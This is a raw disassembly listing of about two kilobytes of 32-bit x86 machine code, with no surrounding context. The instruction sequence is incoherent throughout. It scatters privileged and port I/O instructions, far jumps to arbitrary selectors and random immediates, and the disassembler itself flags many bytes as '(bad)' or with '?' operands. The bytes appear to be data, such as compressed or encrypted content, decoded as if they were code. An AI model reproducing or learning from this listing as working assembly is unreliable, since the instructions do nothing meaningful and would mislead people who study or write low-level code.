  4067f7:	adc    ch,BYTE PTR [esp+esi*1+0x1aae553c]
  4067fe:	sbb    BYTE PTR [ebx-0x376746d2],dl
  406804:	sbb    al,0x4a
  406806:	mov    eax,ds:0x22e7db07
  40680b:	xchg   edi,eax
  40680c:	fiadd  WORD PTR [edi]
  40680e:	fisttp WORD PTR [ecx-0x548e684c]
  406814:	mov    ch,0xb0
  406816:	mov    bh,0xc8
  406818:	pop    eax
  406819:	scas   eax,DWORD PTR es:[edi]
  40681a:	cmp    al,0x1a
  40681c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40681d:	cmp    esp,DWORD PTR [eax-0x64f6095e]
  406823:	ss adc ebx,esp
  406826:	arpl   WORD PTR es:[edi],bp
  406829:	jb     0x4067c1
  40682b:	mov    ah,0x82
  40682d:	fnstenv [esi]
  40682f:	clc    
  406830:	xor    DWORD PTR [esi+0x9ab6844],edx
  406836:	push   0xffffffdf
  406838:	hlt    
  406839:	int    0x55
  40683b:	mul    DWORD PTR [edi+0x74]
  40683e:	lahf   
  40683f:	popf   
  406840:	mov    gs,ebp
  406842:	iret   
  406843:	or     eax,0x89a68023
  406848:	dec    ecx
  406849:	inc    eax
  40684a:	mov    al,ds:0x69b4689a
  40684f:	ror    eax,cl
  406851:	mov    ds:0xa47c7af0,al
  406856:	inc    ecx
  406857:	scas   eax,DWORD PTR es:[edi]
  406858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406859:	cmp    eax,0xb123427a
  40685e:	pop    esi
  40685f:	pop    ebp
  406860:	push   edx
  406861:	xor    eax,0xa7e2e530
  406866:	pop    ds
  406867:	jae    0x406838
  406869:	dec    edi
  40686a:	jmp    FWORD PTR [ecx]
  40686c:	fild   QWORD PTR [edx-0x6fc52b41]
  406872:	push   cs
  406873:	sbb    al,0x25
  406875:	repz pusha 
  406877:	ficom  WORD PTR [edx]
  406879:	fstp   QWORD PTR [edi]
  40687b:	retf   
  40687c:	por    mm3,QWORD PTR [edi+0x17]
  406880:	je     0x4068b4
  406882:	loopne 0x40689e
  406884:	sub    DWORD PTR [ebp-0x4aa641aa],edx
  40688a:	inc    ebx
  40688b:	sub    dh,BYTE PTR [edx]
  40688d:	push   esp
  40688e:	test   eax,0x98c7e780
  406893:	rcr    BYTE PTR [edi-0x72],1
  406896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406897:	aam    0x4
  406899:	in     eax,0xea
  40689b:	add    al,al
  40689d:	adc    eax,0x4c116f74
  4068a2:	cwde   
  4068a3:	fnstcw WORD PTR [esi-0x54]
  4068a6:	add    DWORD PTR [edx-0x4815e516],0xc82ff29d
  4068b0:	call   0xa0c2:0x5b41b711
  4068b7:	cmp    DWORD PTR [ecx+0x69984f2f],0x580e534c
  4068c1:	in     al,dx
  4068c2:	cmp    eax,ebx
  4068c4:	(bad)  
  4068c5:	dec    ebx
  4068c6:	jo     0x40686d
  4068c8:	lea    ebp,[ecx+0x44]
  4068cb:	add    BYTE PTR [ecx],dl
  4068cd:	sahf   
  4068ce:	in     al,0x66
  4068d0:	test   BYTE PTR es:[eax-0x75b2c173],bh
  4068d7:	mov    cl,0x1a
  4068d9:	ja     0x406893
  4068db:	shr    DWORD PTR [esi-0x30],0x5d
  4068df:	mov    cs,esi
  4068e1:	mov    ebp,DWORD PTR [edi-0x3e]
  4068e4:	add    BYTE PTR [edi+0xe],ch
  4068e7:	test   BYTE PTR [eax-0x4f6a9e90],0xc
  4068ee:	inc    ebx
  4068ef:	xor    DWORD PTR [edi],0xffffffd9
  4068f2:	add    DWORD PTR [esi-0x54ce5cdb],ecx
  4068f8:	jge    0x406945
  4068fa:	imul   ecx,edx,0x54
  4068fd:	mov    dl,0x4f
  4068ff:	push   esi
  406900:	(bad)  
  406901:	adc    al,BYTE PTR [ecx]
  406903:	not    BYTE PTR [eax-0x3e47da97]
  406909:	push   0xa
  40690b:	mov    WORD PTR [ecx-0x35258b5],ss
  406911:	mov    esp,0x68491823
  406916:	inc    eax
  406917:	mov    al,ds:0x3bf08335
  40691c:	sahf   
  40691d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40691e:	adc    ch,BYTE PTR [ebp-0x4f]
  406921:	push   esp
  406922:	inc    edi
  406923:	data16 clc 
  406925:	sub    DWORD PTR [edx+0x31b50b85],ebp
  40692b:	daa    
  40692c:	popf   
  40692d:	xor    DWORD PTR [esi+0x78],0x80980274
  406934:	inc    ebp
  406935:	enter  0x1dc1,0xc3
  406939:	pop    esp
  40693a:	mov    esi,0x6b7bca8
  40693f:	lods   al,BYTE PTR ds:[esi]
  406940:	inc    edx
  406941:	jae    0x406918
  406943:	sbb    DWORD PTR [edi+eiz*1+0x4745c64],eax
  40694a:	int    0x79
  40694c:	clc    
  40694d:	xchg   ebp,eax
  40694e:	mov    edi,0x5980be6e
  406953:	push   ds
  406954:	push   ebx
  406955:	jne    0x406932
  406957:	ja     0x4069a6
  406959:	hlt    
  40695a:	js     0x40698d
  40695c:	jns    0x4069c7
  40695e:	inc    esp
  40695f:	retf   0x1e71
  406962:	or     BYTE PTR [eax-0xb],dh
  406965:	inc    eax
  406966:	and    al,cl
  406968:	mov    ds:0xb85fe0ce,eax
  40696d:	sti    
  40696e:	mov    al,0x1c
  406970:	push   ebp
  406971:	sub    eax,0x4f859e36
  406976:	cld    
  406977:	daa    
  406978:	pop    ss
  406979:	je     0x4069a9
  40697b:	in     eax,0x1b
  40697d:	cli    
  40697e:	adc    al,0x7a
  406980:	dec    edi
  406981:	push   eax
  406982:	sbb    BYTE PTR [edx+ebx*4],bl
  406985:	arpl   WORD PTR es:[edx],ax
  406988:	cmp    al,0xb7
  40698a:	pop    ss
  40698b:	mov    DWORD PTR ds:0xdf384b03,ebp
  406991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406992:	or     dh,BYTE PTR [esi]
  406994:	sbb    al,0x1f
  406996:	or     eax,0x24d68802
  40699b:	out    0xe,al
  40699d:	fsub   DWORD PTR [ebx+eax*8]
  4069a0:	xor    BYTE PTR [edx],bl
  4069a2:	outs   dx,DWORD PTR ds:[esi]
  4069a3:	fcomp  st(5)
  4069a5:	adc    BYTE PTR [ebx+0x55a5e361],dh
  4069ab:	fisubr WORD PTR [edi-0x7097e67f]
  4069b1:	jecxz  0x406992
  4069b3:	js     0x406a10
  4069b5:	outs   dx,BYTE PTR ds:[esi]
  4069b6:	iret   
  4069b7:	mov    al,0x71
  4069b9:	adc    al,0x38
  4069bb:	inc    eax
  4069bc:	mov    bl,0x2d
  4069be:	sbb    eax,0x49c0922c
  4069c3:	inc    eax
  4069c4:	adc    ah,cl
  4069c6:	fisttp QWORD PTR [edx]
  4069c8:	in     al,dx
  4069c9:	xchg   edx,eax
  4069ca:	mov    esp,0x66862e99
  4069cf:	pop    eax
  4069d0:	dec    ebx
  4069d1:	jnp    0x4069d8
  4069d3:	mov    ebp,0xa57b2a8c
  4069d8:	sbb    esp,ebp
  4069da:	bound  edx,QWORD PTR [eax]
  4069dc:	lahf   
  4069dd:	mov    ebx,0x26a15412
  4069e2:	xor    dl,bh
  4069e4:	test   DWORD PTR [ecx-0x61],0xa463b2b3
  4069eb:	push   ebx
  4069ec:	fisttp WORD PTR [ebx]
  4069ee:	scas   eax,DWORD PTR es:[edi]
  4069ef:	dec    edx
  4069f0:	cmc    
  4069f1:	mov    ebp,0x84ca4f6b
  4069f6:	dec    ebx
  4069f7:	add    DWORD PTR [edx-0x70],0x26
  4069fb:	inc    ebx
  4069fc:	je     0x40698f
  4069fe:	test   al,0xdd
  406a00:	popf   
  406a01:	(bad)  
  406a02:	push   esi
  406a03:	cs dec ebx
  406a05:	adc    bh,BYTE PTR [ecx-0x76]
  406a08:	ja     0x4069dd
  406a0a:	retf   
  406a0b:	mov    ebp,edi
  406a0d:	in     al,0x8f
  406a0f:	xor    eax,esi
  406a11:	xchg   BYTE PTR [edx-0x663861e],al
  406a17:	addr16 pop ebx
  406a19:	sub    bl,BYTE PTR [edi-0x7f457896]
  406a1f:	xchg   edi,eax
  406a20:	ds loop 0x406a49
  406a23:	add    esp,DWORD PTR [eax]
  406a25:	cmp    BYTE PTR [edi-0x1f2be9b3],0x2c
  406a2c:	mov    ds:0x343f74be,eax
  406a31:	mov    DWORD PTR [eax-0x2f],ecx
  406a34:	mov    esi,0x93bd06ae
  406a39:	movd   mm0,DWORD PTR [edi+eax*4-0x42]
  406a3e:	ins    DWORD PTR es:[edi],dx
  406a3f:	aaa    
  406a40:	test   DWORD PTR [edi-0x36f09bac],ebx
  406a46:	popa   
  406a47:	dec    ecx
  406a48:	int    0x94
  406a4a:	adc    BYTE PTR [ebx+0x50],ch
  406a4d:	xchg   esi,eax
  406a4e:	stos   DWORD PTR es:[edi],eax
  406a4f:	jnp    0x406a2a
  406a51:	ja     0x406a3f
  406a53:	pop    eax
  406a54:	jl     0x406a87
  406a56:	ficomp WORD PTR [edi]
  406a58:	fdiv   QWORD PTR [ebx]
  406a5a:	xchg   esi,eax
  406a5b:	jge    0x406a30
  406a5d:	int3   
  406a5e:	and    al,0x84
  406a60:	jmp    0x27ce:0x4a3b68d9
  406a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a68:	stc    
  406a69:	outs   dx,DWORD PTR ds:[esi]
  406a6a:	out    0x6d,eax
  406a6c:	inc    dx
  406a6e:	sbb    bh,BYTE PTR [esi-0x39]
  406a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a72:	adc    al,0xec
  406a74:	mov    eax,0x585063e7
  406a79:	sbb    DWORD PTR [ebp-0x42],0x4a
  406a7d:	cmp    al,0xc9
  406a7f:	lods   al,BYTE PTR ds:[esi]
  406a80:	jle    0x406a3b
  406a82:	daa    
  406a83:	sti    
  406a84:	push   ebx
  406a85:	mov    eax,0xdd35a391
  406a8a:	adc    BYTE PTR [eax-0x7fa47fec],dl
  406a90:	mov    dl,BYTE PTR [ebp+0x23df4a5e]
  406a96:	scas   al,BYTE PTR es:[edi]
  406a97:	lahf   
  406a98:	pop    ebp
  406a99:	call   0xabe93a54
  406a9e:	in     eax,0x85
  406aa0:	lds    esp,FWORD PTR [edx]
  406aa2:	icebp  
  406aa3:	lock inc esi
  406aa5:	jbe    0x406ad7
  406aa7:	inc    ebx
  406aa8:	dec    ecx
  406aa9:	add    BYTE PTR [edi+0x0],al
  406aac:	arpl   WORD PTR [eax-0x4],sp
  406aaf:	scas   al,BYTE PTR es:[edi]
  406ab0:	sbb    al,bl
  406ab2:	sub    bh,0x40
  406ab5:	fcom   QWORD PTR [edi]
  406ab7:	xchg   ecx,eax
  406ab8:	cmp    al,0x76
  406aba:	jmp    0x967d:0x8321d023
  406ac1:	sub    dh,BYTE PTR [edx-0x1c]
  406ac4:	inc    esp
  406ac5:	adc    eax,0xbee87a2c
  406aca:	loop   0x406b1f
  406acc:	das    
  406acd:	pand   mm7,QWORD PTR [ecx+0x7038346]
  406ad4:	jbe    0x406ac1
  406ad6:	cmp    dl,BYTE PTR [esi]
  406ad8:	cli    
  406ad9:	pop    ebx
  406ada:	mov    DWORD PTR [eax+0x46],edi
  406add:	xor    eax,0x775b3938
  406ae2:	sbb    ecx,ebp
  406ae4:	push   ecx
  406ae5:	push   ebp
  406ae6:	dec    ebx
  406ae7:	std    
  406ae8:	sbb    al,0x1c
  406aea:	shl    ebx,0xa7
  406aed:	and    al,BYTE PTR [edx]
  406aef:	cmp    ecx,edi
  406af1:	pop    ss
  406af2:	js     0x406ac2
  406af4:	jae    0x406ada
  406af6:	and    al,0xfb
  406af8:	dec    edi
  406af9:	(bad)  [esp+ecx*8]
  406afc:	cmp    eax,0xc9956981
  406b01:	inc    esi
  406b02:	sbb    ah,BYTE PTR [edx]
  406b04:	mov    esp,0x38603544
  406b09:	add    al,ch
  406b0b:	jl     0x406b2d
  406b0d:	shr    DWORD PTR ds:0xe4ceca7d,1
  406b13:	mov    cl,0xa0
  406b15:	mov    ecx,0x1666a39f
  406b1a:	(bad)  [ebp-0x75]
  406b1d:	adc    bl,BYTE PTR [edi-0x74731a62]
  406b23:	pop    es
  406b24:	push   ds
  406b25:	inc    ebp
  406b26:	push   ebx
  406b27:	daa    
  406b28:	push   edi
  406b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2a:	dec    ebp
  406b2b:	sbb    cl,ah
  406b2d:	lea    ecx,[eax+0x6879f17e]
  406b33:	mov    edx,?
  406b35:	push   cs
  406b36:	lods   eax,DWORD PTR ds:[esi]
  406b37:	adc    BYTE PTR [esi],ch
  406b39:	bswap  ebp
  406b3b:	std    
  406b3c:	adc    edx,DWORD PTR [eax+0x77]
  406b3f:	xor    DWORD PTR [edx],0x407719a5
  406b45:	fild   QWORD PTR [edx-0x2f]
  406b48:	add    al,0x6d
  406b4a:	clc    
  406b4b:	xor    dh,BYTE PTR [esi+0x3a]
  406b4e:	inc    ebx
  406b4f:	xor    eax,0x66f155c0
  406b54:	pop    edx
  406b55:	loope  0x406bcf
  406b57:	xchg   edx,eax
  406b58:	mov    dl,0xd5
  406b5a:	mov    bl,0x72
  406b5c:	ffree  st(6)
  406b5e:	test   BYTE PTR [esp+esi*1+0x45e36e4a],ch
  406b65:	test   BYTE PTR [ebx+eax*2+0x1a2eed43],cl
  406b6c:	or     DWORD PTR [eax-0x4d],ebx
  406b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b70:	ja     0x406b7b
  406b72:	push   ecx
  406b73:	or     BYTE PTR [edi*1-0x3daef273],bl
  406b7a:	js     0x406bc9
  406b7c:	ins    DWORD PTR es:[edi],dx
  406b7d:	(bad)  
  406b7e:	mov    esi,0x808bf29e
  406b83:	mov    ah,0xa1
  406b85:	pop    edx
  406b86:	sti    
  406b87:	ss pusha 
  406b89:	fwait
  406b8a:	mov    ch,0xfb
  406b8c:	mov    edi,0x4bc9821f
  406b91:	dec    esi
  406b92:	cmc    
  406b93:	int    0x6f
  406b95:	inc    ebx
  406b96:	repnz stc 
  406b98:	jnp    0x406bc4
  406b9a:	(bad)  
  406b9b:	cmp    al,BYTE PTR fs:[ebp+0x70]
  406b9f:	jae    0x406be3
  406ba1:	jnp    0x406ba7
  406ba3:	(bad)  
  406ba5:	pop    ss
  406ba6:	xor    eax,0x8f2f717e
  406bab:	cmp    eax,0x9d5e21d9
  406bb0:	adc    esi,DWORD PTR [eax]
  406bb2:	scas   eax,DWORD PTR es:[edi]
  406bb3:	ffree  st(0)
  406bb5:	dec    eax
  406bb6:	nop
  406bb7:	aad    0xcf
  406bb9:	outs   dx,BYTE PTR ds:[esi]
  406bba:	rol    ah,cl
  406bbc:	jge    0x406c16
  406bbe:	(bad)  
  406bbf:	stos   DWORD PTR es:[edi],eax
  406bc0:	sbb    BYTE PTR [edx-0x56],dh
  406bc3:	icebp  
  406bc4:	faddp  st(4),st
  406bc6:	cmc    
  406bc7:	ss mov edx,0x666eb806
  406bcd:	lods   eax,DWORD PTR ds:[esi]
  406bce:	xor    ecx,DWORD PTR [esi-0x1c1b491d]
  406bd4:	pop    esp
  406bd5:	push   ebp
  406bd6:	mov    ch,0xc2
  406bd8:	cmp    al,0x2c
  406bda:	push   ss
  406bdb:	xchg   esi,eax
  406bdc:	shr    BYTE PTR [ecx],0xd
  406bdf:	loopne 0x406bf5
  406be1:	mov    ?,edi
  406be3:	mov    ecx,0x73072b84
  406be8:	fmul   QWORD PTR ds:0xd73c8b89
  406bee:	repnz jecxz 0x406bc3
  406bf1:	add    DWORD PTR [ebp+0x6981628d],edi
  406bf7:	(bad)  
  406bf8:	jns    0x406bc5
  406bfa:	mov    DWORD PTR [edi+0x374ff512],edx
  406c00:	int3   
  406c01:	imul   esi,esi,0x382ab959
  406c07:	dec    edi
  406c08:	fs sbb al,0x75
  406c0b:	xchg   edx,eax
  406c0c:	outs   dx,BYTE PTR ds:[esi]
  406c0d:	jle    0x406c10
  406c0f:	scas   al,BYTE PTR es:[edi]
  406c10:	ret    
  406c11:	xchg   esi,eax
  406c12:	push   esi
  406c13:	iret   
  406c14:	out    dx,eax
  406c15:	mov    cl,0x4c
  406c17:	leave  
  406c18:	xchg   bh,ch
  406c1a:	rol    BYTE PTR [esi+0x36],1
  406c1d:	mov    ah,ah
  406c1f:	lahf   
  406c20:	push   ebx
  406c21:	sub    DWORD PTR [edx+0x20],eax
  406c24:	rcl    DWORD PTR [ebp-0x1405185b],0x5a
  406c2b:	mov    esi,0x5c9b148f
  406c30:	sti    
  406c31:	sbb    cl,BYTE PTR [ecx-0x2dd951b5]
  406c37:	xor    edx,ebx
  406c39:	xlat   BYTE PTR ds:[ebx]
  406c3a:	inc    edx
  406c3b:	inc    edx
  406c3c:	mov    esp,0xb557522b
  406c41:	push   ss
  406c42:	jmp    0x31aee9fc
  406c47:	jne    0x406c88
  406c49:	repnz or bl,BYTE PTR [ebx-0x3f2ccf33]
  406c50:	popf   
  406c51:	shl    DWORD PTR [ecx+0x55],0x15
  406c55:	fcomp  st(3)
  406c57:	(bad)  
  406c58:	icebp  
  406c59:	in     eax,dx
  406c5a:	(bad)  
  406c5b:	out    0x8e,eax
  406c5d:	imul   ecx,DWORD PTR [ebx+0x7d492ff0],0x4e
  406c64:	or     DWORD PTR [edi],ebp
  406c66:	xchg   DWORD PTR [ebx],ecx
  406c68:	das    
  406c69:	pop    edi
  406c6a:	sbb    BYTE PTR [esi-0x2c],dl
  406c6d:	mov    dl,0xb
  406c6f:	add    eax,0xd1e5d54b
  406c74:	test   BYTE PTR [ebx],dl
  406c76:	add    DWORD PTR [edx],0x45ac0d99
  406c7c:	mov    esi,0x1194443e
  406c81:	mov    ds:0x35a843ed,al
  406c86:	cs int3 
  406c88:	aad    0x6e
  406c8a:	fcomp  DWORD PTR [ebp+0x11e58830]
  406c90:	pop    es
  406c91:	push   cs
  406c92:	sar    DWORD PTR [edi],cl
  406c94:	mov    al,ds:0xff23b561
  406c99:	js     0x406c9f
  406c9b:	jo     0x406c48
  406c9d:	xor    eax,0xf15ac465
  406ca2:	mov    ecx,0xf9c8f66c
  406ca7:	outs   dx,BYTE PTR ds:[esi]
  406ca8:	adc    bh,BYTE PTR [edx-0xa]
  406cab:	xchg   esp,eax
  406cac:	pop    esp
  406cad:	push   ss
  406cae:	lds    ebp,FWORD PTR [edx]
  406cb0:	adc    eax,0x9ac5815a
  406cb5:	lahf   
  406cb6:	mov    esp,0xfc72f7fa
  406cbb:	ficomp WORD PTR [eax-0x2821c8f2]
  406cc1:	jl     0x406cd2
  406cc3:	jmp    0x406d1c
  406cc5:	sbb    esp,DWORD PTR [ebp-0x71]
  406cc8:	sub    bh,dh
  406cca:	ror    BYTE PTR [eax-0x746a703b],cl
  406cd0:	in     eax,dx
  406cd1:	aaa    
  406cd2:	ins    DWORD PTR es:[edi],dx
  406cd3:	mov    BYTE PTR [ecx],bl
  406cd5:	rcl    cl,0x40
  406cd8:	pop    ebp
  406cd9:	in     eax,dx
  406cda:	jo     0x406ce4
  406cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cdd:	jmp    DWORD PTR [eax-0x2c]
  406ce0:	mov    al,0x49
  406ce2:	jae    0x406caa
  406ce4:	fsin   
  406ce6:	(bad)  
  406ce7:	mov    eax,ds:0x4d80dd32
  406cec:	sub    dl,cl
  406cee:	sahf   
  406cef:	xchg   esp,eax
  406cf0:	arpl   WORD PTR [edi+0x44],bp
  406cf3:	dec    esi
  406cf4:	or     eax,0x8be3548f
  406cf9:	jnp    0x406cb2
  406cfb:	pop    ds
  406cfc:	jge    0x406d25
  406cfe:	popa   
  406cff:	lods   eax,DWORD PTR ds:[esi]
  406d00:	push   edi
  406d01:	fsubr  QWORD PTR [ecx+0x3d792d34]
  406d07:	push   0x47dbde73
  406d0c:	sub    al,0x22
  406d0e:	in     al,0x1
  406d10:	imul   edi,eax,0x3
  406d13:	arpl   WORD PTR [ebp-0x29],dx
  406d16:	(bad)  
  406d17:	retf   
  406d18:	cmp    DWORD PTR [edi-0x7eefd66d],0xffffffcc
  406d1f:	jbe    0x406cbc
  406d21:	sub    al,0x18
  406d23:	cdq    
  406d24:	maxps  xmm4,XMMWORD PTR [esi]
  406d27:	(bad)  
  406d28:	xchg   ebx,eax
  406d29:	popf   
  406d2a:	push   esp
  406d2b:	xor    eax,0xec75640d
  406d30:	xor    BYTE PTR [edx],ah
  406d32:	or     al,0x15
  406d34:	sbb    eax,0x5d6b2754
  406d39:	push   ecx
  406d3a:	mov    ebp,DWORD PTR [eax]
  406d3c:	jmp    0x406d7c
  406d3e:	jg     0x406d5d
  406d40:	pop    ebx
  406d41:	cdq    
  406d42:	sub    dh,BYTE PTR [esi-0x37]
  406d45:	cwde   
  406d46:	pop    esi
  406d47:	pushf  
  406d48:	(bad)  
  406d49:	outs   dx,DWORD PTR ds:[esi]
  406d4a:	(bad)  
  406d4b:	push   edx
  406d4c:	mov    esp,0x98576076
  406d51:	cmp    eax,DWORD PTR [edi+ebx*1+0x683ed98b]
  406d58:	xchg   edi,eax
  406d59:	dec    esp
  406d5a:	dec    ecx
  406d5b:	push   0x2e
  406d5d:	loope  0x406da9
  406d5f:	jmp    0x35:0x62514459
  406d66:	adc    ch,dl
  406d68:	mul    ecx
  406d6a:	dec    ebp
  406d6b:	stos   BYTE PTR es:[edi],al
  406d6c:	sbb    BYTE PTR [edi-0x73],dh
  406d6f:	loop   0x406dc1
  406d71:	clc    
  406d72:	pop    ds
  406d73:	iret   
  406d74:	imul   ebp,DWORD PTR [esi],0xf3dfd7f2
  406d7a:	xor    ecx,DWORD PTR [edx]
  406d7c:	inc    eax
  406d7d:	iret   
  406d7e:	nop
  406d7f:	xchg   esi,eax
  406d80:	push   0x6c768a14
  406d85:	enter  0x4856,0x38
  406d89:	out    dx,al
  406d8a:	ror    DWORD PTR [edi-0x5b],cl
  406d8d:	mov    eax,ds:0xa01098fc
  406d92:	and    esp,0x7e82d83e
  406d98:	push   ds
  406d99:	push   ebp
  406d9a:	adc    edx,DWORD PTR [ebx+eiz*8+0x7f]
  406d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d9f:	fimul  WORD PTR [esi-0x2819f3de]
  406da5:	inc    esi
  406da6:	repnz cmp al,BYTE PTR [esi]
  406da9:	add    al,0x62
  406dab:	adc    eax,0xc50c88a3
  406db0:	mov    BYTE PTR [ebp+0xd1a0e00],dh
  406db6:	cli    
  406db7:	cs jle 0x406e28
  406dba:	test   BYTE PTR [edi-0x6fdc8bad],ch
  406dc0:	fistp  WORD PTR [esi+eax*1+0x10caa588]
  406dc7:	jmp    0xb57ee747
  406dcc:	fdiv   QWORD PTR [ecx-0x2c]
  406dcf:	cmp    al,0xea
  406dd1:	mov    ebp,0x9e388fa6
  406dd6:	jo     0x406e3f
  406dd8:	pop    edi
  406dd9:	shr    BYTE PTR [ebx-0x7efe36ac],1
  406ddf:	test   BYTE PTR fs:[ebp+0x5f6e0854],0x96
  406de7:	pop    esp
  406de8:	push   ecx
  406de9:	bound  edi,QWORD PTR [edi+0x207daf6]
  406def:	aas    
  406df0:	dec    edx
  406df1:	hlt    
  406df2:	push   edi
  406df3:	and    al,0xad
  406df5:	adc    BYTE PTR [esi-0x6424bf1f],cl
  406dfb:	cmc    
  406dfc:	fdiv   st,st(6)
  406dfe:	hlt    
  406dff:	adc    al,al
  406e01:	loopne 0x406e3a
  406e03:	out    0x67,al
  406e05:	repnz inc edx
  406e07:	inc    ebp
  406e08:	rep ins BYTE PTR es:[edi],dx
  406e0a:	fmul   DWORD PTR [eax+edi*2]
  406e0d:	cmp    ch,cl
  406e0f:	and    al,0xc
  406e11:	sub    eax,0x4e5a019c
  406e16:	mov    dh,0xb7
  406e18:	lods   al,BYTE PTR ds:[esi]
  406e19:	sub    BYTE PTR [edi+eax*1],ah
  406e1c:	imul   edx,DWORD PTR [ecx],0x0
  406e1f:	enter  0xa24f,0x2c
  406e23:	les    esi,FWORD PTR [edi-0x1f]
  406e26:	and    eax,0xa818c329
  406e2b:	adc    eax,0xffffffe6
  406e2e:	mov    al,ds:0xb6be7a61
  406e33:	sub    al,BYTE PTR [ebx]
  406e35:	mov    bh,0xb3
  406e37:	shl    dl,1
  406e39:	cmp    eax,0x22e945b1
  406e3e:	sbb    eax,0x1a7fe391
  406e43:	and    al,0xdb
  406e45:	int    0x4a
  406e47:	or     DWORD PTR [edi],ebx
  406e49:	test   al,0xfc
  406e4b:	push   ebp
  406e4c:	test   eax,0x67e1e177
  406e51:	daa    
  406e52:	mov    eax,0xa2148f4
  406e57:	pushf  
  406e58:	lods   eax,DWORD PTR ds:[esi]
  406e59:	test   BYTE PTR [ebx+edi*8+0x34544b8f],ch
  406e60:	(bad)  
  406e61:	xchg   ebx,eax
  406e62:	popf   
  406e63:	jbe    0x406ee4
  406e65:	aaa    
  406e66:	mov    dl,0xb5
  406e68:	jg     0x406dfb
  406e6a:	popf   
  406e6b:	clc    
  406e6c:	pop    ebx
  406e6d:	xchg   DWORD PTR [edx],ecx
  406e6f:	adc    ah,BYTE PTR [edi+0x37dde977]
  406e75:	scas   al,BYTE PTR es:[edi]
  406e76:	xor    bh,BYTE PTR [edi]
  406e78:	inc    esi
  406e79:	mov    edx,0xa8dafe52
  406e7e:	jge    0x406e4f
  406e80:	xor    BYTE PTR [edi+0x63],bh
  406e83:	cmp    DWORD PTR [ecx+eiz*2],0xb
  406e87:	jl     0x406e31
  406e89:	sub    ebp,ebp
  406e8b:	ror    DWORD PTR [edx],cl
  406e8d:	outs   dx,BYTE PTR ds:[esi]
  406e8e:	xchg   ebx,eax
  406e8f:	pop    ss
  406e90:	adc    DWORD PTR [ecx+0x75],0xfffffff6
  406e94:	push   0xdf4a77ef
  406e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e9a:	das    
  406e9b:	push   esp
  406e9c:	sbb    edx,DWORD PTR [ebx+0xb]
  406e9f:	sub    eax,DWORD PTR [edi+0x71]
  406ea2:	dec    esi
  406ea3:	inc    esi
  406ea4:	ins    BYTE PTR es:[edi],dx
  406ea5:	sbb    eax,0x692ce01f
  406eaa:	in     al,0xde
  406eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ead:	add    al,0x2c
  406eaf:	push   esp
  406eb0:	loopne 0x406ed9
  406eb2:	fdivr  DWORD PTR [edx-0x69]
  406eb5:	adc    cl,bl
  406eb7:	imul   ebx,DWORD PTR [edi-0x4fbea229],0x9e759eee
  406ec1:	add    eax,0x6ca92586
  406ec6:	dec    edi
  406ec7:	stos   DWORD PTR es:[edi],eax
  406ec8:	aas    
  406ec9:	nop
  406eca:	sbb    BYTE PTR [ebx-0x17],ah
  406ecd:	mov    ebx,0x567d82bc
  406ed2:	mov    edx,0xa937797e
  406ed7:	mov    eax,esp
  406ed9:	mov    ah,0xb4
  406edb:	repnz std 
  406edd:	cmp    al,0x22
  406edf:	in     eax,dx
  406ee0:	fistp  QWORD PTR [edi+ecx*1]
  406ee3:	mov    ebx,0xa4ddd634
  406ee8:	pop    ebp
  406ee9:	call   0x1382:0x64367ffb
  406ef0:	xor    al,0xd1
  406ef2:	sub    dl,dl
  406ef4:	leave  
  406ef5:	push   0x87d0f773
  406efa:	xor    ecx,DWORD PTR [ecx-0x6a9cbb3f]
  406f00:	enter  0x18c2,0x2d
  406f04:	mov    dl,dh
  406f06:	or     al,0x29
  406f08:	lahf   
  406f09:	cwde   
  406f0a:	mov    bh,dl
  406f0c:	div    BYTE PTR [eax-0x25ed5f9d]
  406f12:	and    ebp,DWORD PTR [edx-0x77]
  406f15:	sbb    al,0xfe
  406f17:	and    DWORD PTR [esi],0xc9fd88fc
  406f1d:	nop
  406f1e:	add    eax,0x69c6ebc6
  406f23:	jne    0x406f6f
  406f25:	mov    BYTE PTR [ebp-0x7be2894e],0xe0
  406f2c:	lock sbb bl,BYTE PTR [ecx+0x2b]
  406f30:	mov    ecx,0xe2cfafc2
  406f35:	xchg   edi,eax
  406f36:	jb     0x406eee
  406f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f39:	push   0xb0ae4732
  406f3e:	mov    eax,DWORD PTR [edi-0x41eaff65]
  406f44:	fiadd  WORD PTR [esi]
  406f46:	xor    bh,BYTE PTR ds:0x1cb7f616
  406f4c:	loop   0x406f4c
  406f4e:	xchg   edx,eax
  406f4f:	and    DWORD PTR [edx],ebx
  406f51:	and    al,BYTE PTR [eax+ecx*4]
  406f54:	inc    BYTE PTR [edi+0xe148629]
  406f5a:	repz xchg esi,eax
  406f5c:	(bad)  
  406f5d:	xor    edx,DWORD PTR [eax+0x26]
  406f60:	shl    DWORD PTR [esi],0x2
  406f63:	shl    DWORD PTR [ecx],1
  406f65:	inc    ebx
  406f66:	icebp  
  406f67:	jge    0x406fb5
  406f69:	fild   DWORD PTR [esi+ebx*1+0x73]
  406f6d:	sbb    al,0x4d
  406f6f:	mov    esi,0x6f91fd01
  406f74:	mov    cl,0xac
  406f76:	aaa    
  406f77:	push   ebp
  406f78:	fcom   QWORD PTR [edx-0xbae11ac]
  406f7e:	hlt    
  406f7f:	addr16 dec edx
  406f81:	push   esi
  406f82:	iret   
  406f83:	fwait
  406f84:	pop    edi
  406f85:	push   edi
  406f86:	sti    
  406f87:	arpl   WORD PTR [esi],cx
  406f89:	pop    es
  406f8a:	cmp    bl,bh
  406f8c:	jle    0x406fc8
  406f8e:	shr    ebx,1
  406f90:	mov    eax,ds:0x81894a50
  406f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f96:	sar    DWORD PTR [ebp+0x39],cl
  406f99:	stc    
  406f9a:	push   ss
  406f9b:	mov    eax,ds:0x24bde66
